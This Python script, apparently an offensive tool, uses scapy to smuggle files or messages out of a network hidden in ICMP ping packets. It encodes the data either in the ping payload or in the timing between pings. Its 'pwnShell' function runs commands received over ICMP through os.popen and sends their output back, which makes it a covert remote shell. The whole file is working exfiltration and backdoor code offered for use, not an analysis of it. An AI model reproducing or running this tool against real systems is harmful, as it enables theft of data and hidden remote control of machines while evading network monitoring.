import os, sys, base64, argparse
from time import sleep
from scapy.all import *

# different methods of exfiltration:
# - time-based (server and client pre-establish time diff, maybe pattern)
# - Timestamp-binary (different length, so easily seen, maybe packets can
#   be modified so that length is the same with padding)
# - data-based (remaining bytes - more noisy)
#
# maybe option to add a reverse shell: server on client, receives
# data from pings, sends back data with pings.
# option to set time difference on TimeBased

def dataFile(filename):
    f = open(filename, "r")
    content = f.read()
    f.close()

    return content

def raw(p):
    return p[ICMP][Raw].load[16:32]

def isICMP(p):
    return p.haslayer(ICMP) and p[ICMP].type==8

def timeBasedCommunication(interface):

    s = sniff(iface=interface, lfilter = lambda packet : isICMP(packet),
              stop_filter = lambda packet : isICMP(packet) and '\n' in raw(packet))

    # if interface is loopback for testing purposes,
    # each packet is duplicated so we need to remove it

    if interface == "lo":
        s = [s[i] for i in range(len(s)) if i % 2 == 0]

    msg = "1"

    for n in range(1, len(s)):
        diff = int((s[n].time - s[n-1].time) * 10)
        msg += (diff- (1 * (diff % 2 != 0)))/2 * "0" +  ("1" * (diff % 2 != 0))

    data = hex(int(msg, 2))[2:].replace("L", "").decode("hex")

    return data

def lastBytesCommunication(interface):
    s = sniff(iface=interface, lfilter = lambda packet : isICMP(packet),
              stop_filter = lambda packet : isICMP(packet) and '\n' in raw(packet))

    buf = [raw(i) for i in s]

    # if interface is loopback for testing purposes,
    # each packet is duplicated so we need to remove it

    if interface == "lo":
        buf = [buf[i] for i in range(len(buf)) if i % 2 == 0]

    buf = ''.join(buf)
    dec = base64.b64decode(buf[:buf.find('\n')])

    return dec

# - data-based (remaining bytes - more noisy)
def exfiltrateLastBytes(data, ip, src, verbose):

    if verbose:
        print "[*] Destination of data: {}".format(ip)
        if src:
            print "[*] Sending encoded file: {}".format(src)
        else:
            print "[*] Sending encoded message: \"{}\"".format(data)

    # add final signal to stop receiving data
    string = base64.b64encode(data).encode("hex") + "0a"

    # split into blocks to send message
    blocks = []
    for i in range(0, len(string), 32):
        blocks.append(string[i:i+32])

    # make last block padded
    blocks[-1] = blocks[-1] + (32 - len(blocks[-1])) * "0"

    # send blocks one by one
    for i in blocks:
        os.system("ping -c1 -p {} {} > /dev/null".format(i, ip))

    if verbose:
        print "[*] Message sent to {}".format(ip)

# - time-based (send in time sequence)
def exfiltrateTimeBased(data, ip, src, verbose):

    seq = bin(int((data).encode("hex"), 16))

    if verbose:
        print "[*] Destination of data: {}".format(ip)
        if src:
            print "[*] Sending encoded file: {}".format(src)
        else:
            print "[*] Sending encoded message: \"{}\"".format(data)

    for i in seq[2:]:
        sleep(.1)
        if int(i):
            os.system("ping -c1 {} > /dev/null".format(ip))
        else:
            sleep(.1)

    os.system("ping -c1 -p {} {} > /dev/null".format("0a", ip))

    if verbose:
        print "[*] Message sent to {}".format(ip)

def server(interface, mode):

    received = []

    for x in range(1):

        if mode == 1:
            data = lastBytesCommunication(interface)
        elif mode == 2:
            data = timeBasedCommunication(interface)
        else:
            return

        received.append(data)

    return "\n".join(received) + "\n"

def pwnShell(interface, mode, ip, receiver):

    verbose = 0

    while True:
        if receiver:
            data = server(interface, mode)
            cmd = os.popen(data).read()
            if mode == 1:
                exfiltrateLastBytes(cmd, ip, "", verbose)
            elif mode == 2:
                exfiltrateTimeBased(cmd, ip, "", verbose)
            else:
                return
        else:
            cmd = raw_input("> ")
            if mode == 1:
                exfiltrateLastBytes(cmd, ip, "", verbose)
            elif mode == 2:
                exfiltrateTimeBased(cmd, ip, "", verbose)
            else:
                return
            data = server(interface, mode)
            print data.strip()

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='Client that sends data disguised in ICMP packets. Keep in mind settings need to be the same for the server')
    parser.add_argument('-m', '--mode', type=int, default=1, help='the mode of exfiltration: 1 is lousy (inside packets), 2 time-based')
    parser.add_argument('-i', '--interface', type=str, help='interface to listen on (if shell mode)', required=True)
    parser.add_argument('-s', '--shell', help='use shell option', required=True, action='store_true')

    dataArgs = parser.add_mutually_exclusive_group(required=True)
    dataArgs.add_argument('-f', '--file', type=str, help='file to be sent')
    dataArgs.add_argument('-d', '--data', type=str, help='data to be sent')

    requiredNamed = parser.add_argument_group('required named arguments')
    requiredNamed.add_argument('-H', '--host', type=str, help='the destination of the packets (ex: 127.0.0.1)', required=True)

    args = parser.parse_args()

    data = args.data
    ip = args.host

    if args.file:
        data = dataFile(args.file)

    if args.shell:
        pwnShell(args.interface, args.mode, ip, 0)

    else:
        if args.mode == 1:
            exfiltrateLastBytes(data, ip, args.file, 1)
        elif args.mode == 2:
            exfiltrateTimeBased(data, ip, args.file, 1)
